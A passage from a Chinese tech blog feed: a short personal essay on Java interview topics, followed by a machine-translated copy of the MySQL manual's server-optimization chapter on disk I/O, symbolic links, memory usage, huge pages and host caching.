    <content type="text"><![CDATA[先说问到的东西 负载均衡 DNS LVS Nginx 常用的 原理 路由转发 数据库:分库分表.底层 dubbo 注册原理 dubbo与springcloud 区别 java常用工具包 conllection底层 IO 底层 多线程技术 executoService shell 查看网络连接 查看系统版本 从文件中找到最大数 算法:排序.负载均衡算法.缓存淘汰算法 python vb脚本 渗透. 加分项 ps:能说明你对技术感兴趣 反正大公司就是各种底层.原理.机制等等 说下我对java的理解 concurrentHashMap 锁结构 是否能重入 spring aop spring事务 传播性 等等 分布式事务一致性 ThreadPool 就像开车一样.每个技术都是别人发明的.用规章制度才能更好的驾驭别人开发出来的武器.不要怀疑别人为什么那么写(至少你还不够那个资格).不要问为什么这么写.应该问别人为什么会这么做(是不是开起车来.更快更稳).还是那句话. 还有底层.我一个小二本.没本事入大公司法眼.自然也就不会’更’关注底层.先了解了架构.数据流向. 你至少应该明白你做的系统是个什么东西.你做的是那一块.需要什么样的性能 在这个基础上.有些人会不再钻研技术.走向管理岗位.这也是很多管理广而不细. 还有一些人开始了技术底层之路.也就是资深人士. 现在进不去没关系.以后我会的.]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【服务器优化】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-system%2F</url>
    <content type="text"><![CDATA[本节讨论数据库服务器的优化技术，主要处理系统配置而不是调整SQL语句。本节中的信息适用于想要确保他们管理的服务器的性能和可扩展性的DBA; 对于构建包括设置数据库的安装脚本的开发人员; 以及那些希望最大限度提高自身生产力的开发，测试等人员自己运行MySQL。 8.12.1系统因素 123456789101112131415161718192021一些系统级因素可能会以主要方式影响性能：如果有足够的RAM，则可以删除所有交换设备。某些操作系统在某些情况下使用交换设备，即使您拥有可用内存。避免对MyISAM表格进行外部锁定 。默认值是禁用外部锁定。在 --external-locking和 --skip-external-locking 选项明确地启用和禁用外部锁定。只要您只运行一台服务器，禁用外部锁定不会影响MySQL的功能。请记住在运行myisamchk之前取下服务器（或者锁定并冲洗相关的表格） 。在某些系统中，强制禁用外部锁定是因为它无法工作。唯一不能禁用外部锁定的情况是在 同一数据上运行多个MySQL 服务器（而不是客户端），或者如果您运行 myisamchk检查（而不是修复）表而不告知服务器先刷新和锁定表。请注意 ，除了使用NDB群集时，通常不建议使用多个MySQL服务器同时访问相同的数据。该LOCK TABLES和 UNLOCK TABLES语句使用内部锁定，所以你可以使用他们，即使外部锁定被禁用。 8.12.2优化磁盘I / O 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283本节介绍如何在您将更多更快的存储硬件投入数据库服务器时配置存储设备。有关优化 InnoDB配置以提高I / O性能的信息，请参见第8.5.8节“优化InnoDB磁盘I / O”。磁盘寻求是一个巨大的性能瓶颈。当数据量开始变得如此之大以至于不能有效缓存时，这个问题就会变得更加明显。对于您可以随意访问数据的大型数据库，您可以确保至少需要一次磁盘查找以及一些磁盘写入操作。为了尽量减少这个问题，请使用低寻道时间的磁盘。通过将文件符号链接到不同的磁盘或剥离磁盘来增加可用磁盘主轴的数量（从而减少查找开销）：使用符号链接这意味着，对于MyISAM表，您可以将索引文件和数据文件从其在数据目录中的常用位置符号链接到另一个磁盘（也可以是条带化的）。这使得查找和读取时间更好，假设磁盘也不用于其他目的。参见 第8.12.3节“使用符号链接”。符号链接不支持与InnoDB表一起使用 。但是，可以将InnoDB数据和日志文件放置在不同的物理磁盘上。有关更多信息，请参见第8.5.8节“优化InnoDB磁盘I / O”。条带化条带化意味着您有许多磁盘，并将第一个磁盘块，第二个磁盘上的第二个磁盘N块和（）磁盘上的第 - 个磁盘块，依此类推。这意味着如果您的正常数据大小小于条带大小（或完全对齐），则可以获得更好的性能。分条非常依赖操作系统和条带大小，因此可以用不同的条带大小对应用程序进行基准测试。参见第8.13.2节“使用自己的基准”。 N MOD number_of_disks对于分拆的速度差是 非常依赖的参数。根据您设置条带参数和磁盘数量的方式，您可能会得到数量级差异。您必须选择针对随机或顺序访问进行优化。为了保证可靠性，您可能需要使用RAID 0 + 1（分条加镜像），但在这种情况下，您需要2个 N驱动器来保存 N数据驱动器。如果你有钱，这可能是最好的选择。但是，您可能还需要投资一些卷管理软件来有效处理它。一个好的选择是根据数据类型的重要性来改变RAID级别。例如，存储可在RAID 0磁盘上重新生成的半重要数据，但存储真正重要的数据，例如主机信息和日志记录在RAID 0 + 1或RAID N磁盘上。N由于更新奇偶校验位所需的时间，如果您有很多写操作，则RAID 可能会成为问题。您还可以设置数据库使用的文件系统的参数：如果您不需要知道上次访问文件的时间（这在数据库服务器上并不真正有用），则可以使用该-o noatime 选项安装文件系统。这会跳过对文件系统inode中最后一次访问时间的更新，从而避免一些磁盘搜索。在许多操作系统上，可以通过将该-o async选项挂载来将文件系统设置为异步更新。如果您的计算机相当稳定，这应该可以提供更好的性能而不会牺牲太多的可靠性。（这个标志在Linux上默认打开。）在MySQL中使用NFS建议在考虑使用NFS与MySQL时谨慎。潜在问题因操作系统和NFS版本而异，其中包括：放置在NFS卷上的MySQL数据和日志文件被锁定并无法使用。例如，如果多个MySQL实例访问相同的数据目录，或由于停电等原因导致MySQL不正确关闭，则可能会出现锁定问题。NFS版本4通过引入基于咨询和基于租约的锁定来解决潜在的锁定问题。但是，不建议在MySQL实例中共享数据目录。由于收到的消息乱序或网络流量丢失而​​导致数据不一致。要避免此问题，请使用TCP hard和 intr安装选项。最大文件大小限制。NFS版本2客户端只能访问文件的最低2GB（带符号32位偏移量）。NFS版本3客户端支持较大的文件（最多64位偏移量）。支持的最大文件大小还取决于NFS服务器的本地文件系统。在专业SAN环境或其他存储系统中使用NFS往往比在这种环境之外使用NFS提供更高的可靠性。但是，SAN环境中的NFS可能比直接连接或总线连接的非循环存储要慢。如果您选择使用NFS，建议使用NFS版本4或更高版本，与在部署到生产环境之前彻底测试NFS设置一样。 8.12.3使用符号链接 8.12.3.1在Unix上使用数据库的符号链接 8.12.3.2在Unix上使用MyISAM表的符号链接 8.12.3.3在Windows上使用数据库的符号链接 123456789101112131415您可以将数据库或表从数据库目录移动到其他位置，并用符号链接替换它们到新的位置。例如，您可能想要执行此操作，将数据库移动到具有更多可用空间的文件系统，或者通过将表分布到不同的磁盘来提高系统的速度。对于InnoDB表，请使用语句中的DATA DIRECTORY子句CREATE TABLE而不是符号链接，如第14.7.5节“在数据目录之外创建文件 - 表 - 表空间”中所述。这项新功能是支持的跨平台技术。推荐的方法是将整个数据库目录符号链接到不同的磁盘。符号链接 MyISAM表仅作为最后的手段。要确定数据目录的位置，请使用以下语句：SHOW VARIABLES LIKE&apos;datadir&apos;; 8.12.3.1在Unix上使用数据库的符号链接 12345678910111213在Unix上，符号链接数据库的方式首先是在有空闲空间的磁盘上创建一个目录，然后从MySQL数据目录创建一个到它的软链接。shell&gt; mkdir /dr1/databases/testshell&gt;ln -s /dr1/databases/test /path/to/datadirMySQL不支持将一个目录链接到多个数据库。只要不在数据库之间建立符号链接，用符号链接替换数据库目录就可以工作。假设您db1在MySQL数据目录下有一个数据库 ，然后创建一个符号链接db2指向 db1：shell&gt; shell&gt;cd /path/to/datadirln -s db1 db2其结果是，对于任何表tbl_a中 db1，也似乎是一个表 tbl_a中db2。如果一个客户端更新db1.tbl_a并且另一个客户端更新db2.tbl_a，则可能出现问题。 8.12.3.2在Unix上使用MyISAM表的符号链接 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970符号链接仅完全支持 MyISAM表格。对于其他存储引擎的表使用的文件，如果尝试使用符号链接，则可能会遇到奇怪的问题。对于InnoDB表，请使用 第14.7.5节“在数据目录之外创建文件 - 表 - 表空间”中介绍的替代技术。不要在没有完全可操作realpath()调用的系统上建立符号链接表。（Linux和Solaris支持realpath()）。要确定您的系统是否支持符号链接，请have_symlink使用以下语句检查系统变量的值：SHOW VARIABLES LIKE&apos;have_symlink&apos;;处理MyISAM 表的符号链接的工作如下：在数据目录中，您始终拥有表格format（.frm）文件，data（.MYD）文件和index（.MYI）文件。数据文件和索引文件可以在别处移动并通过符号链接替换到数据目录中。格式文件不能。您可以将数据文件和索引文件独立链接到不同的目录。要指示正在运行的MySQL服务器执行符号链接，请使用DATA DIRECTORY和 INDEX DIRECTORY选项 CREATE TABLE。请参见 第13.1.18节“CREATE TABLE语法”。或者，如果 mysqld未运行，则可以使用 命令行中的ln -s手动完成符号链接。注意用的一方或双方使用的路径DATA DIRECTORY和INDEX DIRECTORY选项可能不包括MySQL的 data目录。（错误＃32167）myisamchk不会替换数据文件或索引文件的符号链接。它直接在符号链接指向的文件上工作。任何临时文件都在数据文件或索引文件所在的目录中创建。同样是真实的 ALTER TABLE， OPTIMIZE TABLE和 REPAIR TABLE语句。注意当您删除使用符号链接的表时，符号 链接和符号链接点将被删除的文件。这是一个非常好的理由，不作为系统 运行 mysqldroot或允许系统用户拥有对MySQL数据库目录的写入权限。如果使用ALTER TABLE ... RENAMEor 重命名表 RENAME TABLE并且不将该表移动到另一个数据库，那么数据库目录中的符号链接将重命名为新名称，并相应地重命名数据文件和索引文件。如果您使用 ALTER TABLE ... RENAME或RENAME TABLE将表移动到另一个数据库，则该表将移动到其他数据库目录。如果表名更改，新数据库目录中的符号链接将重命名为新名称，并相应地重命名数据文件和索引文件。如果您不使用符号链接，请使用该 选项启动 mysqld， --skip-symbolic-links以确保没有人可以使用 mysqld删除或重命名数据目录之外的文件。这些表符号链接操作不受支持：ALTER TABLE忽略 DATA DIRECTORY和INDEX DIRECTORY表格选项。如前所述，只有数据和索引文件可以是符号链接。该.frm文件绝 不能是符号链接。尝试执行此操作（例如，使一个表名称成为另一个表的同义词）会产生不正确的结果。假设你db1在MySQL数据目录下有一个数据库，tbl1在这个数据库中有一个表，并且在db1你创建一个tbl2指向符号链接的目录中 tbl1：shell&gt; shell&gt; shell&gt; shell&gt;cd /path/to/datadir/db1ln -s tbl1.frm tbl2.frmln -s tbl1.MYD tbl2.MYDln -s tbl1.MYI tbl2.MYI问题的结果，如果一个线程读取 db1.tbl1，而另一个线程更新 db1.tbl2：查询缓存是“ 被愚弄的 ”（它无法知道tbl1尚未更新，因此它会返回过期的结果）。ALTER声明 tbl2失败。 8.12.3.3在Windows上使用数据库的符号链接 123456789101112131415161718192021222324在Windows上，符号链接可用于数据库目录。这使您可以通过设置数据库目录的不同位置（例如，在不同的磁盘上）来设置数据库目录的符号链接。在Windows上使用数据库符号链接与在Unix上使用数据库符号链接类似，尽管设置链接的过程有所不同。假设你想要放置一个名为mydbat 的数据库的数据库目录D:\data\mydb。为此，请在指向的MySQL数据目录中创建一个符号链接 D:\data\mydb。但是，在创建符号链接之前，D:\data\mydb必要时通过创建它来确保该 目录存在。如果您已mydb在数据目录中指定了一个数据库目录，请将其移至D:\data。否则，符号链接将无效。为避免出现问题，请确保在移动数据库目录时服务器未运行。Windows Vista，Windows Server 2008或更新版本具有原生符号链接支持，因此您可以使用mklink命令创建符号链接 。该命令需要管理权限。将位置更改为数据目录：C：\&gt; cd \path\to\datadir在数据目录中，创建一个名为的mydb指向数据库目录位置的符号链接 ：C：\&gt; mklink /d mydb D:\data\mydb在此之后，数据库mydb中创建的所有表格 都将在中创建 D:\data\mydb。 8.12.4优化内存使用 8.12.4.1 MySQL如何使用内存 8.12.4.2启用大页面支持 8.12.4.1 MySQL如何使用内存 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267MySQL分配缓冲区和缓存以提高数据库操作的性能。默认配置旨在允许MySQL服务器在具有大约512MB内存的虚拟机上启动。您可以通过增加某些缓存和缓冲区相关系统变量的值来提高MySQL的性能。您还可以修改默认配置以在内存有限的系统上运行MySQL。以下列表描述了MySQL使用内存的一些方式。在适用的情况下，引用相关的系统变量。有些项目是存储引擎或功能特定的。所述InnoDB缓冲器池是保持缓存的存储区InnoDB表，索引，及其它辅助缓冲器中的数据。为了提高高容量读取操作的效率，缓冲池分为 可能包含多行的页面。为了高速缓存管理的效率，缓冲池被实现为页面的链接列表; 很少使用的数据使用LRU算法的变体超时缓存 。有关更多信息，请参见第14.6.3.1节“InnoDB缓冲池”。缓冲池的大小对系统性能很重要：InnoDB在服务器启动时使用malloc()操作为整个缓冲池分配内存 。所述 innodb_buffer_pool_size 系统变量定义缓冲池大小。通常，推荐 innodb_buffer_pool_size 值是系统内存的50％到75％。 innodb_buffer_pool_size 可以在服务器运行时动态配置。有关更多信息，请参见 第14.6.3.2节“配置InnoDB缓冲池大小”。在具有大量内存的系统上，可以通过将缓冲池分为多个缓冲池实例来提高并发性 。所述 innodb_buffer_pool_instances 系统变量定义缓冲池实例的数量。缓冲池太小可能会导致过度搅动，因为页面仅从缓冲池刷新到短时间内再次需要。由于竞争内存，缓冲池太大可能会导致交换。所有线程共享MyISAM 密钥缓冲区。的 key_buffer_size系统变量决定其大小。对于MyISAM服务器打开的每个表，索引文件都打开一次; 对于每个访问表的并发运行线程，数据文件都会打开一次。对于每个并发线程，分配一个表结构，每列的列结构和一个大小的缓冲区 （其中是最大行长度，不包括 列）。一 列需要五到八个字节加上数据的长度 。该 存储引擎维护用于内部使用一个额外的行缓冲。 3 * NNBLOBBLOBBLOBMyISAM所述myisam_use_mmap 系统变量可以被设置为1，使能对所有内存映射MyISAM表。如果内部内存临时表变得太大（使用tmp_table_size和 max_heap_table_size 系统变量确定 ），MySQL会自动将表从内存转换为磁盘格式。磁盘上的临时表使用由internal_tmp_disk_storage_engine 系统变量定义的存储引擎 。您可以按照第8.4.4节“MySQL中的内部临时表使用”中所述增加允许的临时表大小 。对于使用MEMORY明确创建的表CREATE TABLE，只有 max_heap_table_size 系统变量决定允许表增长多少，并且没有转换为磁盘格式。在MySQL性能模式是在低级别监控MySQL服务器执行的功能。性能模式以增量方式动态分配内存，将其内存使用扩展到实际的服务器负载，而不是在服务器启动期间分配所需的内存。一旦分配内存，在服务器重新启动之前它不会被释放。有关更多信息，请参见 第25.16节“性能模式内存分配模型”。服务器用于管理客户端连接的每个线程都需要一些线程特定的空间。以下列表指示这些以及哪些系统变量控制其大小：堆栈（thread_stack）连接缓冲区（net_buffer_length）结果缓冲区（net_buffer_length）连接缓冲区和结果缓冲区每个都以大小等于net_buffer_length字节的大小开始 ，但max_allowed_packet根据需要动态放大到 字节。net_buffer_length在每个SQL语句之后，结果缓冲区会缩小为 字节。当语句正在运行时，还会分配当前语句字符串的副本。每个连接线程都使用内存来计算语句摘要。服务器分配 max_digest_length每个会话的字节数。请参见 第25.9节“性能架构语句摘要”。所有线程共享相同的基本内存。当不再需要线程时，分配给它的内存将被释放并返回到系统，除非线程回到线程缓存中。在这种情况下，内存保持分配。每个执行表的顺序扫描的请求都会分配一个读取缓冲区。的 read_buffer_size系统变量决定缓冲器大小。在以任意顺序读取行时（例如，在排序后）， 可能会分配一个 随机读取缓冲区以避免磁盘搜索。的 read_rnd_buffer_size 系统变量决定缓冲器大小。所有连接都在一次执行中执行，大多数连接都可以在不使用临时表的情况下完成。大多数临时表是基于内存的哈希表。具有较大行长度（以所有列长度的总和计算）或包含BLOB列的临时表 存储在磁盘上。大多数执行排序的请求会根据结果集大小分配排序缓冲区和零到两个临时文件。请参见第B.5.3.5节“MySQL存储临时文件的位置”。几乎所有的解析和计算都是在线程本地和可重用的内存池中完成的。小项目不需要内存开销，从而避免了正常的慢速内存分配和释放。内存仅分配给意外大的字符串。对于每个包含BLOB 列的表，动态地放大缓冲区以读取更大的BLOB值。如果您扫描一个表格，缓冲区会增大到 BLOB最大值。MySQL需要表缓存的内存和描述符。所有使用中表格的处理程序结构都保存在表格缓存中，并作为“ 先进先出 ”（FIFO）进行管理。所述 table_open_cache系统变量定义初始表高速缓存大小; 请参见 第8.4.3.1节“MySQL如何打开和关闭表”。MySQL还需要用于表定义缓存的内存。所述 table_definition_cache 系统变量定义的表定义（距离的数量.frm可以存储在表中定义的高速缓存文件）。如果您使用大量表格，则可以创建大型表格定义缓存以加快表格的打开速度。与表缓存不同，表定义缓存占用更少的空间并且不使用文件描述符。一个FLUSH TABLES语句或 中mysqladmin冲水表命令关闭不在使用一次的所有表，并标记所有在用的表被关闭当前正在执行的线程结束时。这有效地释放了大部分使用中的内存。FLUSH TABLES直到所有表都关闭后才会返回。服务器在内存中缓存信息的结果 GRANT， CREATE USER， CREATE SERVER，和 INSTALL PLUGIN语句。该内存不能由相应的释放 REVOKE， DROP USER， DROP SERVER，和 UNINSTALL PLUGIN 语句，所以执行导致缓存报表的多个实例的服务器上，将有内存使用的增加。这个缓存的内存可以被释放FLUSH PRIVILEGES。ps和其他系统状态程序可能会报告 mysqld使用大量内存。这可能是由不同内存地址上的线程堆栈引起的。例如，Solaris的 ps版本将 堆栈之间未使用的内存计为已用内存。要验证这一点，请检查可用的交换 swap -s。我们 用几个内存泄漏检测器（商业和开源）测试 mysqld，所以应该没有内存泄漏。监视MySQL内存使用情况以下示例演示如何使用 Performance Schema 和sys模式来监视MySQL内存使用情况。大多数性能架构内存工具默认情况下处于禁用状态。可以通过更新ENABLED性能模式setup_instruments表的列 来启用仪器 。记忆仪器的名称形式为 ，其中是诸如或的值，并且 是仪器的详细信息。 memory/code_area/instrument_namecode_areasqlinnodbinstrument_name要查看可用的MySQL内存工具，请查询性能架构 setup_instruments表。以下查询返回所有代码区域的数百个内存工具。MySQL的&gt; SELECT * FROM performance_schema.setup_instruments WHERE NAME LIKE &apos;%memory%&apos;;您可以通过指定代码区域来缩小结果。例如，您可以InnoDB通过指定innodb代码区域将结果限制在 内存仪器中。MySQL的&gt; SELECT * FROM performance_schema.setup_instruments WHERE NAME LIKE &apos;%memory/innodb%&apos;;+ ------------------------------------------- + ----- ---- + ------- +| NAME | ENABLED | TIMED |+ ------------------------------------------- + ----- ---- + ------- +| 内存/ innodb /自适应哈希索引| NO | NO || 内存/ innodb / buf_buf_pool | NO | NO || 内存/ innodb / dict_stats_bg_recalc_pool_t | NO | NO || 内存/ innodb / dict_stats_index_map_t | NO | NO || 内存/ innodb / dict_stats_n_diff_on_level | NO | NO || 内存/ innodb / other | NO | NO || 内存/ innodb / row_log_buf | NO | NO || 内存/ innodb / row_merge_sort | NO | NO || 内存/ innodb / std | NO | NO || 内存/ innodb / trx_sys_t :: rw_trx_ids | NO | NO |...根据您的MySQL安装代码区域可能包括performance_schema， sql，client， innodb，myisam， csv，memory， blackhole， archive， partition，和其他人。要启用内存工具，performance-schema-instrument请在MySQL配置文件中添加一条 规则。例如，要启用所有内存工具，请将此规则添加到您的配置文件并重新启动服务器：性能架构仪器=“存储器/％=计数”注意在启动时启用内存工具可确保启动时发生的内存分配计数。重新启动服务器后，ENABLEDPerformance Schema setup_instruments 表的 列应报告YES您启用的内存工具。内存操作未定时TIMED，setup_instruments表中的 列 被忽略。MySQL的&gt; SELECT * FROM performance_schema.setup_instruments WHERE NAME LIKE &apos;%memory/innodb%&apos;;+ ------------------------------------------- + ----- ---- + ------- +| NAME | ENABLED | TIMED |+ ------------------------------------------- + ----- ---- + ------- +| 内存/ innodb /自适应哈希索引| NO | NO || 内存/ innodb / buf_buf_pool | NO | NO || 内存/ innodb / dict_stats_bg_recalc_pool_t | NO | NO || 内存/ innodb / dict_stats_index_map_t | NO | NO || 内存/ innodb / dict_stats_n_diff_on_level | NO | NO || 内存/ innodb / other | NO | NO || 内存/ innodb / row_log_buf | NO | NO || 内存/ innodb / row_merge_sort | NO | NO || 内存/ innodb / std | NO | NO || 内存/ innodb / trx_sys_t :: rw_trx_ids | NO | NO |...查询记忆仪器数据。在本例中，内存仪器数据在Performance Schema memory_summary_global_by_event_name 表格中查询，该 表格通过对数据进行汇总 EVENT_NAME。这 EVENT_NAME是乐器的名称。以下查询返回InnoDB缓冲池的内存数据 。有关列说明，请参见 第25.11.15.9节“内存汇总表”。MySQL的&gt; SELECT * FROM performance_schema.memory_summary_global_by_event_name WHERE EVENT_NAME LIKE &apos;memory/innodb/buf_buf_pool&apos;\G EVENT_NAME：内存/ innodb / buf_buf_pool COUNT_ALLOC：1 COUNT_FREE：0 SUM_NUMBER_OF_BYTES_ALLOC：137428992 SUM_NUMBER_OF_BYTES_FREE：0 LOW_COUNT_USED：0 CURRENT_COUNT_USED：1 HIGH_COUNT_USED：1 LOW_NUMBER_OF_BYTES_USED：0CURRENT_NUMBER_OF_BYTES_USED：137428992 HIGH_NUMBER_OF_BYTES_USED：137428992可以使用sys架构memory_global_by_current_bytes 表来查询相同的底层数据，该 架构 表显示全局服务器当前的内存使用情况，按分配类型细分。MySQL的&gt; SELECT * FROM sys.memory_global_by_current_bytes WHERE event_name LIKE &apos;memory/innodb/buf_buf_pool&apos;\G*************************** 1. row ******************** ******* event_name：内存/ innodb / buf_buf_pool current_count：1 current_alloc：131.06 MiBcurrent_avg_alloc：131.06 MiB high_count：1 high_alloc：131.06 MiB high_avg_alloc：131.06 MiB该sys模式查询current_alloc通过代码区域聚合当前分配的内存（）：MySQL的&gt; SELECT SUBSTRING_INDEX(event_name,&apos;/&apos;,2) AS code_area, sys.format_bytes(SUM(current_alloc)) AS current_alloc FROM sys.x$memory_global_by_current_bytes GROUP BY SUBSTRING_INDEX(event_name,&apos;/&apos;,2) ORDER BY SUM(current_alloc) DESC;+ --------------------------- + -------- +| code_area | current_alloc |+ --------------------------- + -------- +| 内存/ innodb | 843.24 MiB || 内存/ performance_schema | 81.29 MiB || 内存/ mysys | 8.20 MiB || memory / sql | 2.47 MiB || 内存/内存| 174.01 KiB || 内存/ myisam | 46.53 KiB || 内存/黑洞| 512字节|| 内存/联合| 512字节|| 内存/ csv | 512字节|| 记忆/ vio | 496字节|+ --------------------------- + -------- +有关sys模式的更多信息 ，请参阅 第26章MySQL sys模式。 8.12.4.2启用大页面支持 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106某些硬件/操作系统体系结构支持的内存页面大于默认值（通常为4KB）。这种支持的实际实施取决于底层硬件和操作系统。执行大量内存访问的应用程序可能通过使用大页面来获得性能改进，这是因为减少了翻译旁视缓冲区（TLB）缺失。在MySQL中，InnoDB可以使用大页面为其缓冲池和额外的内存池分配内存。标准使用MySQL中的大页面将尝试使用支持的最大大小，最大为4MB。在Solaris下， “ 超大页面 ”功能可以使用最多256MB的页面。此功能适用于最新的SPARC平台。可以使用--super-large-pages或 --skip-super-large-pages 选项启用或禁用它 。MySQL还支持大型页面支持的Linux实现（在Linux中称为HugeTLB）。在Linux上可以使用大页面之前，必须启用内核来支持它们，并且需要配置HugeTLB内存池。作为参考，HugeTBL API记录在 Documentation/vm/hugetlbpage.txt您的Linux源文件中。最近的一些系统（如红帽企业Linux）的内核似乎默认启用了大页面功能。要检查内核是否为真，请使用以下命令并查找包含“ 巨大 ”的输出行 ：外壳&gt; cat /proc/meminfo | grep -i hugeHugePages_Total：0HugePages_Free：0HugePages_Rsvd：0HugePages_Surp：0Hugepagesize：4096 kB非空命令输出表示存在大页面支持，但零值表示没有配置页面供使用。如果您的内核需要重新配置以支持大页面，请查阅该hugetlbpage.txt文件以获取说明。假设您的Linux内核已启用大页面支持，请使用以下命令将其配置为供MySQL使用。通常，将这些rc文件放入系统启动序列中执行的 文件或等效启动文件中，以便每次系统启动时执行这些命令。在MySQL服务器启动之前，命令应该在引导序列中尽早执行。请务必根据您的系统更改分配编号和组编号。＃设置要使用的页数。＃每页通常为2MB，因此值为20 = 40MB。＃这个命令实际上是分配内存，所以这么多＃内存必须可用。echo 20&gt; / proc / sys / vm / nr_hugepages＃设置允许访问的组号＃内存（在这种情况下为102）。mysql用户必须是＃此组的成员。echo 102&gt; / proc / sys / vm / hugetlb_shm_group＃增加每段允许的shmem数量＃（在这种情况下为12G）。echo 1560281088&gt; / proc / sys / kernel / shmmax＃增加共享内存总量。价值＃是页数。4KB /页，4194304 = 16GB。echo 4194304&gt; / proc / sys / kernel / shmall对于MySQL的使用情况，您通常希望值 shmmax接近的值 shmall。要验证大页面配置，请/proc/meminfo按前面所述重新检查 。现在你应该看到一些非零值：外壳&gt; cat /proc/meminfo | grep -i hugeHugePages_Total：20HugePages_Free：20HugePages_Rsvd：0HugePages_Surp：0Hugepagesize：4096 kB利用这个最后一步 hugetlb_shm_group就是为 mysql用户提供一个“ 无限 ”的 值，用于memlock限制。这可以通过编辑/etc/security/limits.conf或将以下命令添加到 mysqld_safe脚本来完成：ulimit -l无限制将ulimit命令添加到 mysqld_safe会导致 root用户unlimited在切换到mysql用户之前 设置memlock限制 。（这个假定 mysqld_safe由启动 root。）MySQL中的大页面支持默认是禁用的。要启用它，请使用该--large-pages选项启动服务器 。例如，您可以在服务器my.cnf文件中使用以下行 ：的[mysqld]大型网页使用此选项时，会InnoDB自动为其缓冲池和附加内存池使用大页面。如果InnoDB不能这样做，则会回退到使用传统内存并向错误日志中写入警告：警告：使用常规内存池要验证是否正在使用大页面，请/proc/meminfo再次检查 ：外壳&gt; cat /proc/meminfo | grep -i hugeHugePages_Total：20HugePages_Free：20HugePages_Rsvd：2HugePages_Surp：0Hugepagesize：4096 kB 8.12.5优化网络使用 8.12.5.1 MySQL如何使用线程进行客户端连接 8.12.5.2 DNS查找优化和主机缓存 8.12.5.1 MySQL如何使用线程进行客户端连接 123456789101112131415161718192021222324252627282930313233343536373839连接管理器线程处理服务器侦听的网络接口上的客户端连接请求。在所有平台上，一个管理器线程处理TCP / IP连接请求。在Unix上，这个管理器线程还处理Unix套接字文件连接请求。在Windows上，管理器线程处理共享内存连接请求，另一个处理命名管道连接请求。服务器不会创建线程来处理它不会听的接口。例如，不支持命名管道连接的Windows服务器不会创建线程来处理它们。连接管理器线程将每个客户端连接与专用于它的线程关联，以处理该连接的身份验证和请求处理。管理器线程在必要时创建一个新线程，但尝试通过首先查询线程缓存来查看它是否包含可用于连接的线程来避免这样做。当连接结束时，如果缓存未满，则其线程返回到线程缓存。在这种连接线​​程模型中，线程数量与客户端当前连接的线程数量一样多，当服务器工作负载必须扩展以处理大量连接时，这有一些缺点。例如，线程创建和处理变得昂贵。另外，每个线程都需要服务器和内核资源，例如堆栈空间。为了容纳大量的同时连接，每个线程的堆栈大小必须保持很小，导致它或者太小或者服务器消耗大量内存。其他资源也可能耗尽，调度开销可能会变得很大。要控制和监视服务器如何管理处理客户端连接的线程，几个系统和状态变量是相关的。（请参见第5.1.7节“服务器系统变量”和第5.1.9节“服务器状态变量”。）线程缓存的大小由thread_cache_size系统变量决定 。默认值为0（不缓存），这会导致为每个新连接设置线程并在连接终止时处理该线程。设置 thread_cache_size为 N启用 N缓存非活动连接线程。thread_cache_size可以在服务器启动时设置，也可以在服务器运行时更​​改。连接线程在与其关联的客户端连接终止时变为非活动状态。为了监测缓存的线程和多少个线程已创建的数量，因为一个线程无法从缓存中取，监视 Threads_cached和 Threads_created状态变量。您可以max_connections 在服务器启动时或运行时设置，以控制可同时连接的最大客户端数量。当线程堆栈太小时，这会限制服务器可以处理的SQL语句的复杂性，存储过程的递归深度以及其他耗费内存的操作。要N为每个线程设置字节的堆栈大小，请使用 以下命令启动服务器 。 --thread_stack=N 8.12.5.2 DNS查找优化和主机缓存 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182MySQL服务器在内存中维护一个包含客户端信息的主机缓存：IP地址，主机名和错误信息。在host_cache 性能架构表暴露主机缓存，以便它可以使用被检查的内容 SELECT陈述。这可以帮助您诊断连接问题的原因。请参见 第25.11.16.1节“host_cache表”。服务器使用主机缓存有以下几个目的：通过缓存IP到主机名称查找的结果，服务器可避免为每个客户端连接执行DNS查找。相反，对于给定的主机，它只需要对来自该主机的第一个连接执行查找。缓存包含有关在连接过程中发生的错误的信息。有些错误被认为是 “ 阻塞”。“如果没有成功连接的情况下，从给定主机连续发生太多这样的事件，服务器将阻止来自该主机的进一步连接。的 max_connect_errors系统变量决定阻挡发生之前允许的错误的数目。参见第B.5.2.5节“主机&apos;host_name&apos;被阻止”。服务器为非本地TCP连接使用主机缓存。它不使用高速缓存来建立使用回送接口地址（例如127.0.0.1或::1）建立的TCP连接 ，或者使用Unix套接字文件，命名管道或共享内存建立的连接。对于每个新的客户端连接，服务器都使用客户端IP地址来检查客户端主机名是否在主机缓存中。如果没有，则服务器尝试解析主机名。首先，它将IP地址解析为主机名，并将该主机名解析为IP地址。然后将结果与原始IP地址进行比较，以确保它们相同。服务器将有关此操作结果的信息存储在主机缓存中。如果缓存已满，则丢弃最近最少使用的条目。服务器像这样处理主机高速缓存中的条目：当第一个TCP客户端连接从给定IP地址到达服务器时，将创建一个新的缓存条目来记录客户端IP，主机名和客户端查找验证标志。最初，主机名被设置为 NULL并且标志为假。此条目也用于来自同一始发IP的后续客户端连接。如果客户端IP条目的验证标志为false，则服务器将尝试IP到主机名称的DNS解析。如果成功，则使用解析的主机名更新主机名，并将验证标志设置为true。如果解决不成功，则采取的行动取决于错误是永久性的还是暂时性的。对于永久性故障，主机名保持不变NULL ，验证标志设置为true。对于瞬态故障，主机名和验证标志保持不变。（在这种情况下，下一次客户端从此IP连接时会发生另一次DNS解析尝试。）如果在处理来自给定IP地址的传入客户端连接时发生错误，则服务器将更新该IP项的相应错误计数器。有关所记录错误的说明，请参见 第25.11.16.1节“host_cache表”。服务器使用线程安全来执行主机名称解析， 